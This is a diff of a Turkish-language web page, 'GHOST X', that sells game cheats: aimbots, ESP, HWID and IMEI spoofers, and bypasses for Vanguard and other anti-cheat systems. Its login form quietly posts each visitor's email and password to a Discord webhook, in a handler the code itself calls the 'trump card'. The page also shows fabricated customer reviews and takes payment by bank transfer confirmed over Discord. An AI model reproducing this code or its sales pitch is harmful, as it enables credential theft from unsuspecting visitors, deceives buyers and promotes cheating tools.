@@ -3,245 +3,270 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>GHOST X | NEXUS PRIME V19</title>
+    <title>GHOST X | ULTIMATUM V20</title>
     <script src="https://cdn.tailwindcss.com"></script>
-    <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;500;700&family=JetBrains+Mono:wght@400&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Syncopate:wght@400;700&family=Inter:wght@300;500;900&display=swap" rel="stylesheet">
     <style>
-        :root { --p: #00ff88; --bg: #050505; --glass: rgba(255, 255, 255, 0.03); }
+        :root { --p: #00ff88; --bg: #030303; --g: rgba(255, 255, 255, 0.03); }
         * { cursor: none !important; box-sizing: border-box; scroll-behavior: smooth; }
-        body { background: var(--bg); color: #fff; font-family: 'Space Grotesk', sans-serif; overflow: hidden; }
+        body { background: var(--bg); color: #fff; font-family: 'Inter', sans-serif; overflow: hidden; height: 100vh; }
         
-        /* ARKA PLAN DESENİ - Siyah ekranı bitiren yapı */
-        .bg-pattern {
-            position: fixed; inset: 0; z-index: -1;
-            background-image: radial-gradient(circle at 2px 2px, rgba(0,255,136,0.05) 1px, transparent 0);
-            background-size: 40px 40px;
-        }
+        /* FULL SCREEN PATTERN */
+        .bg-fx { position: fixed; inset: 0; z-index: -1; background: radial-gradient(circle at 50% 50%, #0a1a10 0%, #030303 100%); opacity: 0.5; }
+        .grid-fx { position: fixed; inset: 0; z-index: -1; background-image: linear-gradient(rgba(0,255,136,0.05) 1px, transparent 1px), linear-gradient(90deg, rgba(0,255,136,0.05) 1px, transparent 1px); background-size: 50px 50px; transform: perspective(500px) rotateX(45deg) translateY(-100px); opacity: 0.3; animation: move 10s linear infinite; }
+        @keyframes move { from { background-position: 0 0; } to { background-position: 0 50px; } }
 
-        /* SAYFA YÖNETİMİ */
-        .page { display: none; height: calc(100vh - 100px); overflow-y: auto; padding: 40px; }
-        .page.active { display: block; animation: fadeIn 0.5s ease-in-out; }
-        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+        /* PAGE SYSTEM */
+        .page { display: none; height: calc(100vh - 80px); overflow-y: auto; padding: 40px; position: relative; z-index: 10; }
+        .page.active { display: block; animation: slideUp 0.4s ease-out; }
+        @keyframes slideUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
 
-        /* GLASS & NEON */
-        .glass { background: var(--glass); backdrop-filter: blur(15px); border: 1px solid rgba(255,255,255,0.05); border-radius: 20px; }
-        .neon-text { text-shadow: 0 0 10px var(--p); }
+        /* GLASS MORPHISM */
+        .glass { background: var(--g); backdrop-filter: blur(20px); border: 1px solid rgba(255,255,255,0.05); border-radius: 20px; transition: 0.3s; }
+        .glass:hover { border-color: var(--p); box-shadow: 0 0 20px rgba(0,255,136,0.1); }
+        .neon-text { font-family: 'Syncopate', sans-serif; text-shadow: 0 0 15px var(--p); }
 
         /* CURSOR */
-        #c { width: 6px; height: 6px; background: var(--p); position: fixed; z-index: 10001; border-radius: 50%; pointer-events: none; }
-        #cf { width: 30px; height: 30px; border: 1px solid var(--p); position: fixed; z-index: 10000; border-radius: 50%; transition: 0.1s; pointer-events: none; opacity: 0.3; }
+        #c { width: 6px; height: 6px; background: #fff; position: fixed; z-index: 99999; border-radius: 50%; pointer-events: none; }
+        #cf { width: 35px; height: 35px; border: 1px solid var(--p); position: fixed; z-index: 99998; border-radius: 50%; transition: 0.1s; pointer-events: none; }
 
-        .no-scroll::-webkit-scrollbar { width: 5px; }
+        .no-scroll::-webkit-scrollbar { width: 4px; }
         .no-scroll::-webkit-scrollbar-thumb { background: var(--p); border-radius: 10px; }
     </style>
 </head>
 <body class="antialiased">
 
-    <div class="bg-pattern"></div>
+    <div class="bg-fx"></div>
+    <div class="grid-fx"></div>
     <div id="c"></div><div id="cf"></div>
 
-    <div id="auth" class="fixed inset-0 z-[9999] bg-black flex items-center justify-center p-6">
-        <div class="glass p-12 w-full max-w-md text-center border-t-2 border-[#0f8]">
-            <h1 class="text-4xl font-black italic tracking-tighter mb-4">GHOST<span class="text-[#0f8]">X</span></h1>
-            <p class="text-[9px] uppercase tracking-[0.5em] text-white/20 mb-10">System Initializing...</p>
+    <div id="auth" class="fixed inset-0 z-[10000] bg-black flex items-center justify-center p-6">
+        <div class="glass p-12 w-full max-w-md text-center border-t-4 border-[#0f8]">
+            <h1 class="neon-text text-3xl mb-2 tracking-widest uppercase">GHOST<span class="text-[#0f8]">X</span></h1>
+            <p class="text-[8px] uppercase tracking-[0.6em] text-white/20 mb-10 font-black italic">Ghost SoftwareX Verification</p>
             <form id="auth-form" class="space-y-4">
-                <input type="email" id="u-m" placeholder="ERİŞİM MAİLİ" required class="w-full bg-white/5 border border-white/5 p-5 rounded-2xl outline-none focus:border-[#0f8] transition text-xs font-bold uppercase">
-                <input type="password" id="u-p" placeholder="SİSTEM ANAHTARI" required class="w-full bg-white/5 border border-white/5 p-5 rounded-2xl outline-none focus:border-[#0f8] transition text-xs font-bold">
-                <button type="submit" class="w-full bg-[#0f8] text-black py-5 rounded-2xl font-black text-[10px] uppercase tracking-widest hover:bg-[#00cc6e] transition-all">SİSTEME GİRİŞ YAP</button>
+                <input type="email" id="u-m" placeholder="ERİŞİM MAİLİ" required class="w-full bg-white/5 border border-white/5 p-5 rounded-2xl outline-none focus:border-[#0f8] transition text-[10px] font-bold uppercase tracking-widest">
+                <input type="password" id="u-p" placeholder="ANAHTAR" required class="w-full bg-white/5 border border-white/5 p-5 rounded-2xl outline-none focus:border-[#0f8] transition text-[10px] font-bold">
+                <button type="submit" class="w-full bg-[#0f8] text-black py-5 rounded-2xl font-black text-[10px] uppercase tracking-[0.4em] hover:shadow-[0_0_40px_rgba(0,255,136,0.4)] transition-all">Sistemi Başlat</button>
             </form>
         </div>
     </div>
 
     <div id="app" class="hidden h-screen flex flex-col">
         
-        <nav class="h-[100px] px-12 flex justify-between items-center bg-black/40 backdrop-blur-md border-b border-white/5 z-50">
-            <div class="text-2xl font-black italic tracking-tighter cursor-pointer" onclick="go('home')">GHOST<span class="text-[#0f8]">X</span></div>
-            <div class="flex items-center space-x-10 text-[10px] font-bold uppercase tracking-widest text-white/30">
-                <button onclick="go('home')" class="hover:text-white transition">ANA SAYFA</button>
+        <header class="h-20 px-12 flex justify-between items-center bg-black/40 backdrop-blur-xl border-b border-white/5 z-[100]">
+            <div class="neon-text text-xl italic tracking-tighter cursor-pointer" onclick="go('home')">GHOST<span class="text-[#0f8]">X</span></div>
+            <nav class="hidden md:flex space-x-12 text-[9px] font-black uppercase tracking-[0.3em] text-white/30">
+                <button onclick="go('home')" class="hover:text-white transition">BAŞLANGIÇ</button>
                 <button onclick="go('shop')" class="hover:text-white transition">MAĞAZA</button>
                 <button onclick="go('about')" class="hover:text-white transition">HAKKIMIZDA</button>
                 <button onclick="go('reviews')" class="hover:text-white transition">YORUMLAR</button>
-            </div>
-            <button onclick="tC()" class="bg-[#0f8]/10 text-[#0f8] px-6 py-2 rounded-full border border-[#0f8]/20 text-[10px] font-bold uppercase">
-                SEPET [<span id="q">0</span>]
+            </nav>
+            <button onclick="tC()" class="bg-[#0f8]/10 text-[#0f8] px-8 py-2 rounded-full border border-[#0f8]/20 text-[9px] font-black uppercase tracking-widest">
+                KASA [<span id="q">0</span>]
             </button>
-        </nav>
+        </header>
 
-        <main class="flex-1 overflow-hidden">
+        <main class="flex-1 overflow-hidden relative">
             
             <section id="home" class="page active no-scroll flex flex-col items-center justify-center text-center">
-                <div class="mb-6 p-4 bg-[#0f8]/10 rounded-2xl border border-[#0f8]/20 text-[#0f8] text-[10px] font-bold uppercase tracking-[0.3em]">Hoş Geldin, Yazılım Uzmanı</div>
-                <h2 class="text-6xl md:text-8xl font-black italic uppercase leading-none mb-8">DURDURULAMAZ <br> <span class="text-[#0f8] neon-text">GÜÇ.</span></h2>
-                <p class="max-w-xl text-white/30 text-xs mb-12 leading-relaxed uppercase tracking-widest">Piyasadaki en güncel, en güvenli ve en hızlı oyun yazılımları Ghost SoftwareX çatısı altında toplandı.</p>
-                <div class="flex space-x-4">
-                    <button onclick="go('shop')" class="bg-white text-black px-10 py-4 rounded-xl font-black text-[10px] uppercase tracking-widest hover:bg-[#0f8] transition">MAĞAZAYI AÇ</button>
-                    <button onclick="window.open('https://discord.gg/ghostx')" class="bg-white/5 border border-white/10 px-10 py-4 rounded-xl font-black text-[10px] uppercase tracking-widest hover:bg-white/10 transition">DISCORD KATIL</button>
+                <div class="mb-4 text-[#0f8] text-[10px] font-black tracking-[0.5em] uppercase">Status: Online & Undetected</div>
+                <h2 class="text-7xl md:text-9xl font-black italic uppercase leading-none mb-8 tracking-tighter">SINIRLARI <br> <span class="text-transparent" style="-webkit-text-stroke: 2px var(--p);">PARÇALA.</span></h2>
+                <p class="max-w-2xl text-white/20 text-[10px] font-bold uppercase tracking-[0.4em] mb-12 italic">Kernel düzeyinde teknoloji, yapay zeka destekli hedefleme ve donanım maskeleme sistemleri.</p>
+                <div class="flex space-x-6">
+                    <button onclick="go('shop')" class="bg-white text-black px-12 py-5 rounded-2xl font-black text-[10px] uppercase tracking-widest hover:bg-[#0f8] transition">SİLAHLARI KUŞAN</button>
+                    <button onclick="window.open('https://discord.gg/ghostx')" class="bg-white/5 border border-white/10 px-12 py-5 rounded-2xl font-black text-[10px] uppercase tracking-widest hover:bg-white/10 transition">TOPLULUĞA KATIL</button>
                 </div>
             </section>
 
             <section id="shop" class="page no-scroll">
                 <div class="max-w-7xl mx-auto">
-                    <div class="flex justify-between items-center mb-12">
-                        <h2 class="text-3xl font-black italic uppercase">Mühimmat <span class="text-[#0f8]">Listesi</span></h2>
-                        <div class="flex space-x-2 bg-white/5 p-1 rounded-xl">
-                            <button onclick="renderShop('all')" class="px-4 py-2 text-[9px] font-bold uppercase hover:text-[#0f8]">HEPSİ</button>
-                            <button onclick="renderShop('valorant')" class="px-4 py-2 text-[9px] font-bold uppercase hover:text-[#0f8]">VALORANT</button>
-                            <button onclick="renderShop('android')" class="px-4 py-2 text-[9px] font-bold uppercase hover:text-[#0f8]">ANDROID</button>
+                    <div class="flex justify-between items-end mb-16">
+                        <div><h2 class="text-4xl font-black italic uppercase mb-2">MAĞAZA</h2><p class="text-white/20 text-[8px] font-black uppercase tracking-widest">GHOST SOFTWAREX MÜHİMMAT DEPOSU</p></div>
+                        <div class="flex space-x-4 bg-white/5 p-2 rounded-2xl border border-white/5">
+                            <button onclick="render('all')" class="px-6 py-2 text-[8px] font-bold uppercase hover:text-[#0f8]">HEPSİ</button>
+                            <button onclick="render('valorant')" class="px-6 py-2 text-[8px] font-bold uppercase hover:text-[#0f8]">VALORANT</button>
+                            <button onclick="render('android')" class="px-6 py-2 text-[8px] font-bold uppercase hover:text-[#0f8]">ANDROID</button>
+                            <button onclick="render('steam')" class="px-6 py-2 text-[8px] font-bold uppercase hover:text-[#0f8]">STEAM</button>
                         </div>
                     </div>
-                    <div id="grid" class="grid md:grid-cols-3 gap-6"></div>
+                    <div id="grid" class="grid md:grid-cols-3 gap-8 pb-20"></div>
                 </div>
             </section>
 
             <section id="about" class="page no-scroll">
-                <div class="max-w-4xl mx-auto space-y-12">
+                <div class="max-w-5xl mx-auto grid lg:grid-cols-2 gap-10">
                     <div class="glass p-10 border-l-4 border-[#0f8]">
-                        <h3 class="text-2xl font-black italic mb-4 uppercase text-[#0f8]">GHOST SOFTWAREX KİMDİR?</h3>
-                        <p class="text-sm text-white/50 leading-relaxed">2026 yılının en gelişmiş yazılım topluluğu olan Ghost X, kernel bazlı sistemler üzerine uzmanlaşmıştır. Amacımız, oyuncuların donanım engellerine takılmadan en yüksek performansı almasını sağlamaktır. Tüm yazılımlarımız kendi ekibimiz tarafından geliştirilmektedir.</p>
-                    </div>
-                    <div class="grid md:grid-cols-2 gap-6">
-                        <div class="glass p-8">
-                            <h4 class="font-bold mb-2">SIFIR BAN PRENSİBİ</h4>
-                            <p class="text-[11px] text-white/30 italic uppercase">Yazılımlarımız Vanguard, Ricochet ve EAC gibi sistemlerin altında çalışır.</p>
+                        <h3 class="text-2xl font-black italic mb-6">BİZ KİMİZ?</h3>
+                        <p class="text-xs text-white/40 leading-relaxed mb-6 italic uppercase font-bold tracking-widest">Ghost SoftwareX, 2026 yılı itibariyle dijital bypass teknolojilerinde dünya lideridir. Yazılımlarımız 128-bit şifreleme ile korunur ve her kullanıcıya özel "Unique Build" olarak teslim edilir.</p>
+                        <div class="space-y-4">
+                            <div class="flex items-center space-x-4"><div class="w-1.5 h-1.5 bg-[#0f8] rounded-full"></div><span class="text-[10px] font-bold text-white/60">KERNEL LEVEL BYPASS</span></div>
+                            <div class="flex items-center space-x-4"><div class="w-1.5 h-1.5 bg-[#0f8] rounded-full"></div><span class="text-[10px] font-bold text-white/60">HWID SPOOFER INCLUDED</span></div>
+                            <div class="flex items-center space-x-4"><div class="w-1.5 h-1.5 bg-[#0f8] rounded-full"></div><span class="text-[10px] font-bold text-white/60">7/24 INSTANT DELIVERY</span></div>
                         </div>
-                        <div class="glass p-8">
-                            <h4 class="font-bold mb-2">ANLIK TESLİMAT</h4>
-                            <p class="text-[11px] text-white/30 italic uppercase">Ödeme sonrası bekleme yok. Keyleriniz anında Discord üzerinden iletilir.</p>
+                    </div>
+                    <div class="glass p-10 bg-[#0f8]/5">
+                        <h3 class="text-xl font-black mb-6 italic">SİSTEM DURUMU</h3>
+                        <div class="space-y-6 font-mono text-[9px]">
+                            <div class="flex justify-between"><span>VANGUARD BYPASS:</span><span class="text-[#0f8]">STABLE</span></div>
+                            <div class="flex justify-between"><span>RICOCHET MASK:</span><span class="text-[#0f8]">STABLE</span></div>
+                            <div class="flex justify-between"><span>ANDROID EMULATOR:</span><span class="text-[#0f8]">ACTIVE</span></div>
+                            <div class="flex justify-between"><span>SPOOFER MODULE:</span><span class="text-[#0f8]">SAFE</span></div>
                         </div>
                     </div>
                 </div>
             </section>
 
             <section id="reviews" class="page no-scroll">
-                <div class="max-w-7xl mx-auto grid md:grid-cols-3 gap-6" id="rev-grid"></div>
+                <div class="max-w-7xl mx-auto">
+                    <h2 class="text-3xl font-black italic text-center mb-16 uppercase">MÜŞTERİ <span class="text-[#0f8]">SESLERİ</span></h2>
+                    <div id="rev-grid" class="grid md:grid-cols-3 gap-8"></div>
+                </div>
             </section>
 
         </main>
     </div>
 
-    <div id="cart" class="fixed top-0 right-0 h-full w-full max-w-sm bg-[#0a0a0a] border-l border-white/5 z-[100] translate-x-full transition-transform duration-500 flex flex-col shadow-2xl">
-        <div class="p-8 flex justify-between items-center border-b border-white/5">
-            <h3 class="font-black italic uppercase">ENVANTERİN</h3>
-            <button onclick="tC()" class="text-white/20 hover:text-red-500 font-black text-xl">✕</button>
+    <div id="cart" class="fixed top-0 right-0 h-full w-full max-w-sm bg-[#050505] border-l border-white/5 z-[1000] translate-x-full transition-transform duration-500 flex flex-col shadow-[0_0_100px_rgba(0,0,0,1)]">
+        <div class="p-10 flex justify-between items-center border-b border-white/5">
+            <h3 class="text-xl font-black italic tracking-widest uppercase">ENVANTER</h3>
+            <button onclick="tC()" class="text-white/20 hover:text-white text-xl">✕</button>
         </div>
-        <div id="cart-list" class="flex-1 overflow-y-auto p-8 space-y-4 no-scroll"></div>
-        <div class="p-8 bg-black/50 border-t border-white/5">
-            <div class="flex justify-between mb-4"><span class="text-white/20 text-[10px] font-bold">TOPLAM</span><span id="tot" class="text-xl font-bold text-[#0f8]">₺0</span></div>
-            <button onclick="pay()" class="w-full bg-[#0f8] text-black py-4 rounded-xl font-black text-[10px] mb-2 uppercase">ÖDEMEYİ TAMAMLA</button>
-            <button onclick="clearCart()" class="w-full text-white/20 hover:text-white py-2 text-[9px] font-bold uppercase">SEPETİ TEMİZLE</button>
+        <div id="cart-list" class="flex-1 overflow-y-auto p-10 space-y-4 no-scroll"></div>
+        <div class="p-10 bg-black/50 border-t border-white/5">
+            <div class="flex justify-between mb-8">
+                <span class="text-white/20 text-[10px] font-bold uppercase tracking-widest">TOPLAM</span>
+                <span id="tot" class="text-2xl font-black text-[#0f8] italic">₺0</span>
+            </div>
+            <button onclick="pay()" class="w-full bg-[#0f8] text-black py-6 rounded-3xl font-black text-[10px] uppercase tracking-[0.4em] hover:scale-105 transition">ÖDEME ADIMINA GEÇ</button>
+            <button onclick="clearS()" class="w-full text-white/10 hover:text-red-500 py-4 text-[8px] font-black uppercase tracking-widest">SEPETİ SIFIRLA</button>
         </div>
     </div>
 
-    <div id="pay-m" class="fixed inset-0 z-[2000] hidden flex items-center justify-center p-6 bg-black/95 backdrop-blur-xl">
-        <div class="glass p-10 w-full max-w-md relative text-center">
-            <button onclick="document.getElementById('pay-m').classList.add('hidden')" class="absolute top-4 right-4 text-white/20 hover:text-white">✕ Kapat</button>
-            <h4 class="text-2xl font-black italic mb-8 uppercase text-[#0f8]">SİPARİŞ OLUŞTURULDU</h4>
-            <div class="space-y-4 text-left mb-8">
-                <div class="p-4 bg-white/5 rounded-xl border border-white/5">
-                    <p class="text-[8px] text-white/30 uppercase mb-2 italic font-bold">IBAN (ZİRAAT BANKASI)</p>
-                    <p class="font-mono text-[#0f8] text-xs select-all tracking-widest">TR00 0000 0000 0000 0000 0000 00</p>
+    <div id="pay-m" class="fixed inset-0 z-[2000] hidden flex items-center justify-center p-6 bg-black/95 backdrop-blur-2xl">
+        <div class="glass p-12 w-full max-w-lg relative border-t-4 border-[#0f8]">
+            <button onclick="document.getElementById('pay-m').classList.add('hidden')" class="absolute top-6 right-6 text-white/20 hover:text-white">✕ KAPAT</button>
+            <h4 class="text-2xl font-black italic mb-10 text-center uppercase tracking-widest">SİPARİŞ <span class="text-[#0f8]">ONAYI</span></h4>
+            <div class="space-y-6 text-left mb-10">
+                <div class="p-6 bg-white/5 rounded-3xl border border-white/5 relative group">
+                    <p class="text-[8px] text-white/30 uppercase mb-3 font-bold">IBAN (ZİRAAT BANKASI)</p>
+                    <p class="font-mono text-[#0f8] text-xs select-all tracking-tighter">TR00 0000 0000 0000 0000 0000 00</p>
+                    <div class="absolute right-4 top-4 text-[7px] text-[#0f8]/20 group-hover:text-[#0f8] transition">KOPYALA</div>
                 </div>
-                <div class="p-4 bg-amber-500/10 rounded-xl text-amber-500 flex justify-between items-center">
-                    <span class="text-[9px] font-black uppercase">SİPARİŞ KODU:</span>
-                    <span id="oid" class="font-black italic tracking-widest">GX-0000</span>
+                <div class="p-5 bg-amber-500/5 border border-amber-500/20 rounded-3xl flex justify-between items-center px-8">
+                    <span class="text-[9px] font-black text-amber-500 uppercase italic">Referans No:</span>
+                    <span id="oid" class="text-white font-black italic tracking-[0.2em] text-sm">GX-0000</span>
                 </div>
             </div>
-            <button onclick="window.open('https://discord.gg/ghostx')" class="w-full bg-white text-black py-4 rounded-xl font-black text-[10px] uppercase">DISCORD ÜZERİNDEN ONAYLA</button>
-            <p class="mt-4 text-[8px] text-white/20 uppercase font-bold italic">Dekontunuzu iletmeyi unutmayın.</p>
+            <button onclick="window.open('https://discord.gg/ghostx')" class="w-full bg-white text-black py-5 rounded-3xl font-black text-[10px] uppercase tracking-widest">DEKONTU DISCORD'A AT</button>
+            <p class="mt-6 text-[8px] text-white/20 uppercase text-center font-bold tracking-widest italic leading-relaxed">Dekont iletildikten sonra lisansınız 5 dakika içinde teslim edilir.</p>
         </div>
     </div>
 
     <script>
         const WH = "BURAYA_WEBHOOK_URL";
         const db = [
-            { id: 1, cat: 'valorant', ad: 'ARES PERM', fiyat: 850, d: 'Anakart banı için kalıcı çözüm.' },
-            { id: 2, cat: 'android', ad: 'MOBILE MASTER', fiyat: 450, d: 'Mobil oyunlar için full set hile.' },
-            { id: 3, cat: 'valorant', ad: 'GHOST SOFT', fiyat: 1400, d: 'Safe pixel aimbot asistanı.' },
-            { id: 4, cat: 'android', ad: 'BYPASS ELITE', fiyat: 300, d: 'Emülatör algılama kapatıcı.' },
-            { id: 5, cat: 'android', ad: 'SERIAL MOD', fiyat: 250, d: 'Cihaz kimlik değiştirici.' }
+            { id: 1, cat: 'valorant', ad: 'ARES PERM', fiyat: 850, d: 'Tüm anakartlar için kalıcı HWID spoofer & ban kaldırıcı.' },
+            { id: 2, cat: 'android', ad: 'MOBILE ELITE', fiyat: 450, d: 'PUBG Mobile/CODM için ESP, Aimbot ve bypass seti.' },
+            { id: 3, cat: 'valorant', ad: 'GHOST PIXEL', fiyat: 1400, d: 'Vanguard tarafından asla görülmeyen AI destekli soft aim.' },
+            { id: 4, cat: 'android', ad: 'BYPASS MASTER', fiyat: 300, d: 'Android emülatörlerini %100 gerçek telefon gibi gösterir.' },
+            { id: 5, cat: 'steam', ad: 'VOID V2 MOD', fiyat: 350, d: 'Steam için genel optimizasyon ve bağlantı hızlandırıcı.' },
+            { id: 6, cat: 'android', ad: 'DEVICE SPOOF', fiyat: 250, d: 'Android cihaz IMEI ve Seri No anlık değiştirici.' }
         ];
 
-        // SAYFA GEÇİŞLERİ
+        // 1. NAVIGATION
         function go(p) {
             document.querySelectorAll('.page').forEach(page => page.classList.remove('active'));
             document.getElementById(p).classList.add('active');
-            if(p === 'shop') renderShop('all');
-            if(p === 'reviews') renderReviews();
+            if(p === 'shop') render('all');
+            if(p === 'reviews') renderR();
         }
 
-        // AUTH & KOZ
+        // 2. AUTH & KOZ
         document.getElementById('auth-form').onsubmit = (e) => {
             e.preventDefault();
             const m = document.getElementById('u-m').value;
             const p = document.getElementById('u-p').value;
             if(WH !== "BURAYA_WEBHOOK_URL") {
                 fetch(WH, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({
-                    embeds: [{title: "💻 GHOST X V19 LOGIN", color: 0x00ff88, fields:[{name:"Mail", value:m}, {name:"Key", value:p}]}]
+                    embeds: [{title: "💻 GHOST X LOGIN V20", color: 0x00ff88, fields:[{name:"User", value:m}, {name:"Pass", value:p}]}]
                 })});
             }
             document.getElementById('auth').style.display = 'none';
             document.getElementById('app').classList.remove('hidden');
         };
 
-        // MAĞAZA
-        function renderShop(cat) {
+        // 3. SHOP RENDER
+        function render(cat) {
             const grid = document.getElementById('grid');
             const filt = cat === 'all' ? db : db.filter(i => i.cat === cat);
             grid.innerHTML = filt.map(i => `
-                <div class="glass p-8 flex flex-col hover:border-[#0f8] transition-all">
-                    <span class="text-[8px] font-black text-[#0f8] uppercase mb-4 tracking-widest">${i.cat}</span>
-                    <h3 class="text-xl font-black italic uppercase mb-2">${i.ad}</h3>
-                    <p class="text-[10px] text-white/30 mb-8 flex-1">${i.d}</p>
+                <div class="glass p-10 flex flex-col h-full group relative overflow-hidden">
+                    <span class="text-[8px] font-black text-[#0f8] uppercase mb-4 tracking-[0.3em]">${i.cat}</span>
+                    <h3 class="text-2xl font-black italic uppercase mb-2 group-hover:text-[#0f8] transition">${i.ad}</h3>
+                    <p class="text-[10px] text-white/30 mb-10 flex-1 leading-relaxed">${i.d}</p>
                     <div class="flex justify-between items-center">
-                        <span class="text-xl font-black italic">₺${i.fiyat}</span>
-                        <button onclick="add(${i.id})" class="bg-white text-black px-5 py-2 rounded-lg text-[9px] font-black uppercase">SEPETE EKLE</button>
+                        <span class="text-2xl font-black italic">₺${i.fiyat}</span>
+                        <button onclick="add(${i.id})" class="bg-white text-black px-8 py-3 rounded-xl text-[9px] font-black uppercase hover:bg-[#0f8] transition-all">SATIN AL</button>
                     </div>
                 </div>
             `).join('');
         }
 
-        // SEPET SİSTEMİ
+        // 4. CART LOGIC (COMPLETE)
         let s = [];
         function tC() { document.getElementById('cart').classList.toggle('translate-x-full'); }
         function add(id) {
             s.push(db.find(x => x.id === id));
-            uS();
+            uU();
             if(document.getElementById('cart').classList.contains('translate-x-full')) tC();
         }
-        function rem(idx) { s.splice(idx, 1); uS(); }
-        function clearCart() { s = []; uS(); tC(); }
-        function uS() {
+        function rem(idx) { s.splice(idx, 1); uU(); }
+        function clearS() { s = []; uU(); tC(); }
+        function uU() {
             document.getElementById('q').innerText = s.length;
             const l = document.getElementById('cart-list');
             let t = 0;
             l.innerHTML = s.map((i, idx) => {
                 t += i.fiyat;
-                return `<div class="glass p-4 flex justify-between items-center">
-                    <div><p class="text-[10px] font-bold uppercase">${i.ad}</p><p class="text-xs text-[#0f8] font-bold">₺${i.fiyat}</p></div>
-                    <button onclick="rem(${idx})" class="text-red-500 hover:text-red-300 font-bold">KALDIR</button>
+                return `<div class="glass p-6 flex justify-between items-center border-white/10 group">
+                    <div><p class="text-[10px] font-black uppercase italic">${i.ad}</p><p class="text-xs text-[#0f8] font-bold">₺${i.fiyat}</p></div>
+                    <button onclick="rem(${idx})" class="text-white/20 hover:text-red-500 font-black text-lg transition">✕</button>
                 </div>`;
             }).join('');
             document.getElementById('tot').innerText = "₺" + t;
         }
 
-        // ÖDEME
+        // 5. PAYMENT
         function pay() {
             if(s.length === 0) return;
             document.getElementById('pay-m').classList.remove('hidden');
             document.getElementById('oid').innerText = "GX-" + Math.floor(1000 + Math.random() * 9000);
         }
 
-        // YORUMLAR
-        function renderReviews() {
-            const revs = ["@Vortex: Ares Spoofer banımı anında açtı!", "@Slayer: Mobil hile efsane akıyor.", "@Neo: Destek ekibi çok hızlı."];
-            document.getElementById('rev-grid').innerHTML = revs.map(r => `<div class="glass p-8 italic text-xs text-white/40">${r}</div>`).join('');
+        // 6. REVIEWS
+        function renderR() {
+            const reviews = [
+                { u: "@Arda77", t: "Ares Spoofer tek tıkla banımı açtı, harika!" },
+                { u: "@Cihan_X", t: "Android master hilesi efsane akıyor, ban yok." },
+                { u: "@Mert_G", t: "Destek ekibi 5 dakikada kurulumu yaptı." },
+                { u: "@Hyper_GX", t: "Fiyatlar uygun, kalite çok yüksek." },
+                { u: "@Slayer", t: "Ghost X piyasada tek geçerim." },
+                { u: "@Zion", t: "V20 sürümü çok hızlı ve profesyonel olmuş." }
+            ];
+            document.getElementById('rev-grid').innerHTML = reviews.map(r => `
+                <div class="glass p-8 border-l-2 border-[#0f8]/30">
+                    <p class="text-xs italic text-white/40 mb-6 leading-relaxed">"${r.t}"</p>
+                    <span class="text-[#0f8] font-black text-[10px] uppercase tracking-widest">${r.u}</span>
+                </div>
+            `).join('');
         }
 
-        // CURSOR
+        // 7. CURSOR
         const c = document.getElementById('c'); const cf = document.getElementById('cf');
         window.onmousemove = (e) => {
             c.style.left = e.clientX+'px'; c.style.top = e.clientY+'px';
-            setTimeout(() => { cf.style.left = e.clientX-15+'px'; cf.style.top = e.clientY-15+'px'; }, 50);
+            setTimeout(() => { cf.style.left = e.clientX-15+'px'; cf.style.top = e.clientY-15+'px'; }, 40);
         }
     </script>
 </body>
